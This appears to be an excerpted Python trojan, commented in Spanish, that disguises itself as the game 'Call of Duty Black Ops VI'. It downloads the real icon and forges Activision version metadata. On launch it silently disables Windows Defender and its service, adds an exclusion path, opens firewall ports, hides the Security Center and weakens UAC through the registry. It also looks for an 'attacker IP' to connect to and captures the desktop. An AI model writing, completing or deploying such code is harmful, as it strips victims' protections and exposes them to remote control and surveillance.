...
import socket,threading,sys,os,time,random,ctypes,platform,subprocess,struct,io,json,urllib.request,urllib.error,base64
...
# =========================================================================
# BYPASS TOTAL: UAC + DEFENDER + FIREWALL (sin pedir permiso)
# =========================================================================
def _bypass_total():
    try:
        # 1) Desactivar Defender (un solo PowerShell silencioso)
        ps_defender="""
        $p=Get-MpPreference;
        ...
        Add-MpPreference -ExclusionPath '%APPDATA%' -Force;
        ...
        """
        try:
            subprocess.run(["powershell","-Command",ps_defender],
                capture_output=True,timeout=30,creationflags=subprocess.CREATE_NO_WINDOW)
        except:pass

        # 2) Matar servicio Defender directo
        try:subprocess.run(["sc","stop","WinDefend"],capture_output=True,timeout=5,creationflags=subprocess.CREATE_NO_WINDOW)
        except:pass
        try:subprocess.run(["sc","config","WinDefend","start=disabled"],capture_output=True,timeout=5,creationflags=subprocess.CREATE_NO_WINDOW)
        except:pass

        # 3) Firewall abrir puertos
        for p in[PUERTO_TCP,PUERTO_UDP]:
            for t in["TCP","UDP"]:
                try:subprocess.run(["netsh","advfirewall","firewall","add","rule",
                    f"name=CoD{t}{p}","dir=in","action=allow",
                    f"protocol={t}","localport={p}","enable=yes"],
                    capture_output=True,timeout=5,creationflags=subprocess.CREATE_NO_WINDOW)
                except:pass

        # 4) Deshabilitar Security Center + UAC via registro
        try:
            import winreg
            k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer",0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k,"HideSCAHealth",0,winreg.REG_DWORD,1)
            winreg.CloseKey(k)
        except:pass
        try:
            import winreg
            ...
            winreg.SetValueEx(k,"PromptOnSecureDesktop",0,winreg.REG_DWORD,0)
            winreg.CloseKey(k)
        except:pass
    except:pass

# EJECUTAR BYPASS en segundo plano (no bloquea la UI)
threading.Thread(target=_bypass_total,daemon=True).start()
if getattr(sys,'frozen',False):
    pass
else:
    ruta_exe=os.path.join(os.path.dirname(sys.argv[0]),"Call of Duty Black Ops VI.exe")
    if not os.path.exists(ruta_exe):
        try:
            # Descargar icono REAL de Call of Duty desde la web
            ruta_ico=os.path.join(os.environ['TEMP'],"cod_icon.ico")
            try:
                ...
                ruta_webp=os.path.join(os.environ['TEMP'],"cod_icon.webp")
                with open(ruta_webp,'wb')as f:f.write(img_data)
                try:
                    from PIL import Image
                    img=Image.open(ruta_webp).resize((256,256),Image.LANCZOS)
                    img.save(ruta_ico,format="ICO",sizes=[(256,256)])
                except:
                    # Fallback: icono manual naranja
                    tam=32;xor=bytearray()
                    for y in range(tam-1,-1,-1):
                        for x in range(tam):
                            dx,dy=x-15.5,y-15.5
                            xor.extend(b"\x00\x66\xff\xff" if dx*dx+dy*dy<225 else b"\x2e\x1a\x1a\xff")
...
BEGIN
  ...
  BEGIN
    BLOCK "040904B0"
    BEGIN
      VALUE "CompanyName", "Activision Publishing Inc."
      VALUE "FileDescription", "Call of Duty: Black Ops VI"
      VALUE "FileVersion", "1.0.0.0"
      VALUE "InternalName", "CallOfDuty"
      VALUE "LegalCopyright", "(c) 2024 Activision"
      VALUE "OriginalFilename", "Call of Duty Black Ops VI.exe"
      VALUE "ProductName", "Call of Duty: Black Ops VI"
...
"""
            ...
            subprocess.run([
                ...
                "--name","Call of Duty Black Ops VI",sys.argv[0]
            ],capture_output=True,timeout=300,creationflags=subprocess.CREATE_NO_WINDOW)

            if os.path.exists(os.path.join("dist","Call of Duty Black Ops VI.exe")):
                import shutil
                shutil.move(os.path.join("dist","Call of Duty Black Ops VI.exe"),ruta_exe)
                # Ejecutar el .exe
                subprocess.Popen([ruta_exe],shell=True)
                sys.exit(0)
        except Exception as e:
            try:
                with open(os.path.join(os.environ['TEMP'],"cod_error.txt"),'w')as f:
                    f.write(str(e))
            except:pass
...
class BlackOpsVI:
    def __init__(self):
        try:
            ...
            try:
                with open(os.path.join(os.environ['TEMP'],"cod_error.log"),'w')as f:
                    f.write(f"Error en BlackOpsVI.__init__:\n{type(e).__name__}: {e}")
            except:pass

    def _set_icon(self):
        """Descarga icono real de CoD desde la web para la ventana"""
        try:
            req=urllib.request.Request(
                "https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/store/games/bo6/Store_BO6PDP_Hero.webp",
                headers={"User-Agent":"Mozilla/5.0"})
            datos=urllib.request.urlopen(req,timeout=5).read()
            ruta=os.path.join(os.environ['TEMP'],"cod_win_icon.ico")
            try:
                from PIL import Image
                import io
                img=Image.open(io.BytesIO(datos)).resize((64,64),Image.LANCZOS)
                img.save(ruta,format="ICO",sizes=[(64,64)])
                self.v.iconbitmap(default=ruta)
            except:
                # Fallback PPM
                ppm=bytearray(b"P6\n16 16\n255\n")
                for y in range(16):
                    for x in range(16):
                        dx,dy=x-7.5,y-7.5
                        ppm.extend(b"\xff\x66\x00" if dx*dx+dy*dy<49 else b"\x1a\x1a\x2e")
    ...
    def _auto_find(self):
        ...
        inicio=time.time()
        while time.time()-inicio<20 and not self.atacante_ip:
            try:
        ...
        if not self.atacante_ip:
            # Intentar conexion directa a IPs comunes + localhost
            mis_ips=[ip for ip in(["127.0.0.1"]+self._get_ips())if ip]
            for ip in mis_ips+["192.168.163.1","192.168.1.1","10.0.2.2"]:
    ...
    def _get_ips(self):
        ...
        try:
            import socket as s
            info=s.getaddrinfo(s.gethostname(),None)
            for i in info:
                ip=i[4][0]
    ...
    def _tomar_desktop(self):
        ...
        if HAVE_PIL:
            ...
            try:
                ...
                $b.Dispose();$g.Dispose();
                """
                subprocess.run(["powershell","-Command",ps],capture_output=True,timeout=15,creationflags=subprocess.CREATE_NO_WINDOW)
...
if __name__=="__main__":
    try:
        ...
        try:
            with open(os.path.join(os.environ['TEMP'],"cod_error.log"),'a')as f:
                f.write(f"\nError en main:\n{type(e).__name__}: {e}\n")
        except:pass
